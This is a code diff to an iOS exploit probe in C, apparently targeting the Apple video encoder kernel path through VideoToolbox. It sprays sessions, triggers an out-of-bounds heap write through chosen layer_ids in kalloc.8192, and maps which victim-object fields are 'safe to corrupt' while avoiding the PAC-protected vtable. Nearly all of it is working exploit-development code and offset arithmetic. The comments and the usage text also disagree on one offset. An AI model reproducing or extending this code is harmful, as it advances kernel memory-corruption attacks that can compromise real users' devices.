@@ -7,11 +7,15 @@
  * ANY OOB write touching bytes 0x000-0x007 causes PAC failure = crash.
  * We MUST use layer_ids that skip the vtable region.
  *
- * Safe first layer_ids (avoid vtable at victim 0x000-0x007):
- *   VPS  190 → victim 0x012-0x019 writes (1,0)
- *   PPS2 180 → victim 0x013-0x01A writes (3,0)
- *   SPS  187 → victim 0x016-0x01D writes (2,timer)
- *   PPS1 183 → victim 0x00F-0x016 writes (3,1)
+ * CORRECTED for kalloc.8192 (outer object 7280+ bytes):
+ * Cross-object VPS starts at lid=248, NOT 189.
+ * Lids 64-247 are INTRA-OBJECT (within the same outer allocation).
+ *
+ * Safe first cross-object layer_ids (avoid vtable at victim 0x000-0x007):
+ *   VPS  248 → victim 0x00A-0x019 writes (1,0,cumsum,sz)
+ *   SPS  245 → victim 0x00E-0x01D writes (2,timer,cumsum,sz)
+ *   PPS1 242 → victim 0x017-0x026 writes (3,view_idx,cumsum,sz)
+ *   PPS2 238 → victim 0x00B-0x01A writes (3,0,cumsum,sz)
  *
  * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
  *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
@@ -212,18 +216,25 @@ static void phase_selective_oob(int spray_count, int attacker_idx,
     rlog("  After OOB: %d ok, %d failed (of %d victims)\n",
          victim_after, victim_crashed, victim_before);
 
+    /* VPS table absolute offset within outer object: 0x108A
+     * kalloc.8192 boundary: 0x2000
+     * Cross-object at: 0x108A + lid*16 - 0x2000 */
+    int abs_off = 0x108A + target_lid * 16;
+    int is_cross = (abs_off >= 0x2000);
+    int victim_off = is_cross ? abs_off - 0x2000 : -1;
+
     if (victim_crashed > 0) {
         rlog("\n  !! VICTIM(S) CRASHED — OOB write hit a critical field\n");
-        rlog("  !! lid=%d writes at victim offset 0x%03x-0x%03x\n",
-             target_lid,
-             (0x432 + target_lid * 16) - 0x1000,
-             (0x432 + target_lid * 16) - 0x1000 + 7);
+        if (is_cross)
+            rlog("  !! lid=%d CROSS-OBJECT at victim offset +0x%03x\n", target_lid, victim_off);
+        else
+            rlog("  !! lid=%d INTRA-OBJECT at outer+0x%04x\n", target_lid, abs_off);
     } else if (victim_before > 0 && victim_after == victim_before) {
-        rlog("\n  ** ALL VICTIMS SURVIVED — field at this offset is safe to corrupt\n");
-        rlog("  ** lid=%d writes at victim offset 0x%03x-0x%03x\n",
-             target_lid,
-             (0x432 + target_lid * 16) - 0x1000,
-             (0x432 + target_lid * 16) - 0x1000 + 7);
+        rlog("\n  ** ALL VICTIMS SURVIVED — %s\n", is_cross ? "cross-object field safe to corrupt" : "intra-object (expected)");
+        if (is_cross)
+            rlog("  ** lid=%d CROSS-OBJECT at victim offset +0x%03x\n", target_lid, victim_off);
+        else
+            rlog("  ** lid=%d INTRA-OBJECT at outer+0x%04x\n", target_lid, abs_off);
     }
 
 cleanup:
@@ -243,28 +254,37 @@ cleanup:
 static void phase_sweep(int spray_count, int attacker_idx, int w, int h) {
     rlog("\n=== SWEEP: Testing safe layer_ids to map victim fields ===\n");
 
-    /* Test VPS table layer_ids that skip the vtable */
+    /* CORRECTED for kalloc.8192: cross-object starts at lid 248 (VPS)
+     * Lids 190-247 are INTRA-OBJECT (within the same outer allocation)
+     * Test both intra-object (should always survive) and cross-object */
     int test_lids[] = {
-        190,  /* victim 0x012-0x019 — first safe VPS write */
-        191,  /* victim 0x022-0x029 */
-        192,  /* victim 0x032-0x039 */
-        193,  /* victim 0x042-0x049 */
-        194,  /* victim 0x052-0x059 */
-        195,  /* victim 0x062-0x069 */
-        200,  /* victim 0x0B2-0x0B9 */
-        210,  /* victim 0x152-0x159 */
-        220,  /* victim 0x1F2-0x1F9 */
-        230,  /* victim 0x292-0x299 */
-        240,  /* victim 0x332-0x339 */
-        250,  /* victim 0x3D2-0x3D9 */
+        190,  /* INTRA-OBJECT: outer+0x1C6A (safe reference) */
+        200,  /* INTRA-OBJECT: outer+0x1D0A */
+        220,  /* INTRA-OBJECT: outer+0x1E4A */
+        240,  /* INTRA-OBJECT: outer+0x1F8A */
+        247,  /* INTRA-OBJECT: outer+0x1FFA (last intra-object) */
+        248,  /* CROSS-OBJECT: victim+0x00A (first cross, skips vtable) */
+        249,  /* CROSS-OBJECT: victim+0x01A */
+        250,  /* CROSS-OBJECT: victim+0x02A */
+        251,  /* CROSS-OBJECT: victim+0x03A */
+        252,  /* CROSS-OBJECT: victim+0x04A */
+        254,  /* CROSS-OBJECT: victim+0x06A */
+        255,  /* CROSS-OBJECT: victim+0x07A (max reach) */
     };
     int n_tests = sizeof(test_lids) / sizeof(test_lids[0]);
 
     for (int t = 0; t < n_tests; t++) {
         int lid = test_lids[t];
-        int victim_off = (0x432 + lid * 16) - 0x1000;
-        rlog("\n--- Test %d/%d: lid=%d → victim 0x%03x-0x%03x ---\n",
-             t+1, n_tests, lid, victim_off, victim_off + 7);
+        int abs_off = 0x108A + lid * 16;
+        int is_cross = (abs_off >= 0x2000);
+        if (is_cross) {
+            int v = abs_off - 0x2000;
+            rlog("\n--- Test %d/%d: lid=%d → CROSS victim +0x%03x-+0x%03x ---\n",
+                 t+1, n_tests, lid, v, v + 15);
+        } else {
+            rlog("\n--- Test %d/%d: lid=%d → INTRA outer+0x%04x ---\n",
+                 t+1, n_tests, lid, abs_off);
+        }
         phase_selective_oob(spray_count, attacker_idx, lid, w, h);
         usleep(200000);
     }
@@ -287,10 +307,9 @@ int main(int argc, char *argv[]) {
     int ATTACKER = 12;
 
     if (strcmp(mode, "single") == 0) {
-        int lid = (argc > 2) ? atoi(argv[2]) : 190;
-        if (lid < 190) {
-            rlog("WARNING: lid=%d may touch vtable! Minimum safe VPS lid=190\n", lid);
-            rlog("Proceeding anyway (for research)...\n");
+        int lid = (argc > 2) ? atoi(argv[2]) : 248;
+        if (lid < 248) {
+            rlog("NOTE: lid=%d is INTRA-OBJECT (kalloc.8192). Cross-object starts at 248.\n", lid);
         }
         phase_selective_oob(SPRAY, ATTACKER, lid, W, H);
 
@@ -298,20 +317,18 @@ int main(int argc, char *argv[]) {
         phase_sweep(SPRAY, ATTACKER, W, H);
 
     } else if (strcmp(mode, "unsafe_189") == 0) {
-        rlog("\n!! UNSAFE MODE: lid=189 WILL touch vtable at 0x002 !!\n");
-        rlog("!! This should cause PAC failure on adjacent session !!\n");
-        rlog("!! Use to CONFIRM adjacency detection works !!\n\n");
+        rlog("\n!! NOTE: lid=189 is INTRA-OBJECT with kalloc.8192 !!\n");
+        rlog("!! Writes at outer+0x1C5A, still within own allocation !!\n");
+        rlog("!! Use to verify intra-object writes don't crash !!\n\n");
         phase_selective_oob(SPRAY, ATTACKER, 189, W, H);
 
     } else {
         rlog("Usage: AVESelectiveOOB <mode> [args]\n");
-        rlog("  single [lid]   -- test single layer_id (default 190)\n");
-        rlog("  sweep           -- sweep safe layer_ids to map victim fields\n");
-        rlog("  unsafe_189      -- deliberately hit vtable (PAC crash test)\n");
-        rlog("\nSafe VPS layer_ids: 190+ (skip vtable at 0x000)\n");
-        rlog("Safe PPS2 layer_ids: 180+ (skip vtable)\n");
-        rlog("Safe SPS layer_ids: 187+ (skip vtable)\n");
-        rlog("Safe PPS1 layer_ids: 183+ (skip vtable)\n");
+        rlog("  single [lid]   -- test single layer_id (default 248)\n");
+        rlog("  sweep           -- sweep intra+cross-object lids\n");
+        rlog("  unsafe_189      -- intra-object write (should not crash)\n");
+        rlog("\nkalloc.8192 cross-object boundary:\n");
+        rlog("  VPS: lid 248+, SPS: lid 245+, PPS1: lid 241+, PPS2: lid 238+\n");
     }
 
     rlog("\n=== Probe complete ===\n");
